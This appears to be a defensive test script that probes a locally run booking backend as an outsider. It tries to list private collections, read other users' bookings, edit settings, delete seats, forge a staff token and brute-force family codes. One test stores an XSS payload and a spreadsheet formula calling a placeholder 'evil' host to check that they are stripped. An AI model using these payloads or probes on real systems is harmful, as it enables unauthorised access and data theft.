/* Outsider checks against a running backend: node tools/security-test.js (start tools/mock-server.js first and make one booking). Every line should report blocked / permission / hashes. */
const API='http://localhost:8787/';
const call=async b=>(await fetch(API,{method:'POST',body:JSON.stringify(b)})).json();
(async()=>{
const atk={uid:'u_attackerXXXXXXXXXXXXXXX'};
const t=await call({...atk,a:'list',path:'taken'});
console.log('1 seats visible to public, owner field:', t.docs.map(d=>d.data.owner).join(','), '(should be hashes, not u_...)');
const bk=await call({...atk,a:'list',path:'bookings'}); console.log('2 list all bookings:', bk.ok ? (bk.docs.length+' docs') : bk.code);
for(const c of ['families','reports','feedback','tickets','staffonly','fam','assets']){ const r=c==='assets'?await call({...atk,a:'assets'}):await call({...atk,a:'list',path:c}); console.log('3 list',c,':', r.ok?(r.docs||r.assets).length+' docs':r.code); }
const owners=(await call({...atk,a:'list',path:'taken'})).docs.map(d=>d.data.owner);
const g=await call({...atk,a:'get',path:'bookings/'+owners[0]}); console.log('4 read booking via seat owner:', g.doc===null?'blocked (null)':'LEAKED');
const many=await call({...atk,a:'many',reqs:[{t:'col',path:'bookings'},{t:'doc',path:'config/main'}]}); console.log('5 batch read bookings:', many.res[0].error||('LEAK '+many.res[0].docs.length), '| config:', many.res[1].doc?'ok':'none');
const w=await call({...atk,a:'set',path:'config/main',data:{clinicName:'hacked'}}); console.log('6 visitor edits settings:', w.ok?'ALLOWED!':w.code);
const seat=(await call({...atk,a:'list',path:'taken'})).docs[0];
const d=await call({...atk,a:'delete',path:'taken/'+seat.id}); console.log('7 visitor deletes someone else\'s seat:', d.ok?'ALLOWED!':d.code);
const x=await call({...atk,a:'set',path:'bookings/'+atk.uid,data:{items:{a:{childName:'<img src=x onerror=alert(1)>',note:'=IMPORTXML("http://evil","//a")'}}}});
const back=await call({...atk,a:'get',path:'bookings/'+atk.uid}); console.log('8 markup stripped:', JSON.stringify(back.doc.data.items.a));
const fakeTok=await call({...atk,token:'9999999999999.abc',a:'list',path:'bookings'}); console.log('9 forged staff token:', fakeTok.ok?'ALLOWED!':fakeTok.code);
let rl; for(let i=0;i<160;i++){ rl=await call({...atk,a:'get',path:'fam/'+('0'.repeat(28)+i).slice(-32)}); if(!rl.ok) break; } console.log('10 guessing phone+code:', rl.ok?'no limit!':rl.code);
const pg=await (await fetch(API)).json(); console.log('11 GET only pings:', JSON.stringify(pg));
})();
